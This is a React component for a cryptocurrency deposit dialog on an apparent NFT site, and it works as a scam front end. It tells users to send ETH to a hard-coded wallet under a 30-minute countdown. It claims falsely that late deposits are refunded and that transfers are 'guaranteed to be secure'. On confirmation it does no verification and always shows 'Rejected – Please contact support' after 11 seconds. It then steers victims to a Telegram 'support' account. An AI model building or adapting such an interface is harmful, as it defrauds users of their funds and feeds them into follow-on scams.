
import { useState } from 'react';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from "@/components/ui/dialog";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { CountdownTimer } from "@/components/CountdownTimer";
import { Loader2, HelpCircle, ExternalLink } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import {
  Tooltip,
  TooltipContent,
  TooltipProvider,
  TooltipTrigger,
} from "@/components/ui/tooltip";

interface DepositConfirmationDialogProps {
  isOpen: boolean;
  onClose: () => void;
  amount: string;
  onConfirm: (hash: string) => void;
}

const DepositConfirmationDialog = ({
  isOpen,
  onClose,
  amount,
  onConfirm
}: DepositConfirmationDialogProps) => {
  const [step, setStep] = useState<'amount' | 'hash'>('amount');
  const [depositAmount, setDepositAmount] = useState(amount);
  const [transactionHash, setTransactionHash] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const { toast } = useToast();
  const walletAddress = "0xc68c825191546453e36aaa005ebf10b5219ce175";

  const validateHash = (hash: string) => {
    if (hash.length < 10) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Invalid hash, please check your input"
      });
      return false;
    }
    return true;
  };

  const handleSubmit = async () => {
    if (!validateHash(transactionHash)) {
      return;
    }

    setIsSubmitting(true);
    await new Promise(resolve => setTimeout(resolve, 11000));
    setIsSubmitting(false);
    
    toast({
      variant: "destructive",
      title: "Rejected",
      description: "Please contact support"
    });
    
    onConfirm(transactionHash);
  };

  const handleNextStep = () => {
    const amount = parseFloat(depositAmount);
    if (!depositAmount || amount <= 0) {
      setTimeout(() => {
        toast({
          variant: "destructive",
          title: "Error",
          description: "Please enter a valid amount greater than 0"
        });
      }, 1000);
      return;
    }
    setStep('hash');
  };

  const handleClose = (shouldResetTimer: boolean = false) => {
    if (shouldResetTimer) {
      localStorage.removeItem('countdownEndTime');
    }
    setStep('amount');
    setTransactionHash("");
    setDepositAmount(amount);
    onClose();
  };

  const handleTelegramHelp = () => {
    window.open('https://t.me/purenftsupport', '_blank');
  };

  return (
    <Dialog open={isOpen} onOpenChange={() => handleClose(false)}>
      <DialogContent className="sm:max-w-md relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-b from-background via-background/95 to-background/90 backdrop-blur-xl border-primary/20" />
        <div className="relative">
          <DialogHeader>
            <DialogTitle>Deposit Process</DialogTitle>
            <DialogDescription className="space-y-4">
              {step === 'amount' ? (
                <div className="space-y-4">
                  <div className="space-y-2">
                    <label className="text-sm font-medium text-primary/80">
                      Amount (ETH)
                    </label>
                    <Input
                      type="number"
                      step="0.0001"
                      min="0.0001"
                      value={depositAmount}
                      onChange={(e) => setDepositAmount(e.target.value)}
                      placeholder="Enter amount"
                      className="bg-background/60 border-primary/20 focus:border-primary/40"
                    />
                  </div>
                  <Button 
                    className="w-full bg-primary/20 hover:bg-primary/30 text-primary" 
                    onClick={handleNextStep}
                  >
                    Continue
                  </Button>
                </div>
              ) : (
                <>
                  <p>We have created a request for you.</p>
                  
                  <div className="mt-4">
                    <CountdownTimer endTime={new Date(new Date().getTime() + 30 * 60000).toISOString()} />
                  </div>
                  
                  <div className="space-y-2 mt-4">
                    <p>To send {depositAmount} ETH to the following address:</p>
                    <div className="bg-background/60 p-4 rounded-md border border-primary/20">
                      <div className="break-all font-mono text-primary/90">
                        {walletAddress}
                      </div>
                      <div className="mt-2 text-sm text-muted-foreground">
                        (ERC-20)
                      </div>
                    </div>
                    <div className="mt-2 text-sm text-muted-foreground">
                      <div className="flex items-start gap-2">
                        <p>If you have already transferred Ethereum, but the timer has expired, the funds will be credited back to your original wallet.</p>
                        <TooltipProvider>
                          <Tooltip>
                            <TooltipTrigger>
                              <HelpCircle className="h-4 w-4 flex-shrink-0 text-primary/60" />
                            </TooltipTrigger>
                            <TooltipContent className="max-w-sm bg-background/80 backdrop-blur-sm border-primary/20">
                              <p>We give time limits due to frequent fraudulent activities. During this time, the transfer is guaranteed to be secure for both parties. You cannot cancel deposits more than 3 times per 24 hours.</p>
                            </TooltipContent>
                          </Tooltip>
                        </TooltipProvider>
                      </div>
                    </div>
                  </div>

                  <div className="space-y-2">
                    <div className="flex items-center gap-2">
                      <label className="text-sm font-medium text-primary/80">
                        Transaction Hash
                      </label>
                      <TooltipProvider>
                        <Tooltip>
                          <TooltipTrigger>
                            <HelpCircle className="h-4 w-4 text-primary/60" />
                          </TooltipTrigger>
                          <TooltipContent className="max-w-sm bg-background/80 backdrop-blur-sm border-primary/20">
                            <p>This is the transaction ID. After successful withdrawal of funds from another wallet, you will need to provide a confirmation with the number that appears in other wallet.</p>
                            <Button 
                              variant="link" 
                              className="mt-2 h-auto p-0 text-primary"
                              onClick={handleTelegramHelp}
                            >
                              I need help <ExternalLink className="ml-1 h-3 w-3" />
                            </Button>
                          </TooltipContent>
                        </Tooltip>
                      </TooltipProvider>
                    </div>
                    <Input
                      value={transactionHash}
                      onChange={(e) => setTransactionHash(e.target.value)}
                      placeholder="Enter transaction hash"
                      className="font-mono bg-background/60 border-primary/20 focus:border-primary/40"
                    />
                  </div>

                  <div className="flex gap-2">
                    <Button 
                      variant="outline"
                      className="flex-1 bg-background/60 border-primary/20 hover:bg-primary/10"
                      onClick={() => handleClose(true)}
                    >
                      Cancel transaction
                    </Button>
                    <Button 
                      className="flex-1 bg-primary/20 hover:bg-primary/30 text-primary" 
                      onClick={handleSubmit}
                      disabled={!transactionHash || isSubmitting}
                    >
                      {isSubmitting ? (
                        <>
                          <Loader2 className="mr-2 h-4 w-4 animate-spin" />
                          Processing...
                        </>
                      ) : (
                        'Confirm'
                      )}
                    </Button>
                  </div>

                  <div className="text-center mt-2">
                    <Button
                      variant="link"
                      className="text-primary h-auto p-0 hover:text-primary/80"
                      onClick={handleTelegramHelp}
                    >
                      Need help?<ExternalLink className="ml-0.5 h-3 w-3" />
                    </Button>
                  </div>
                </>
              )}
            </DialogDescription>
          </DialogHeader>
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default DepositConfirmationDialog;
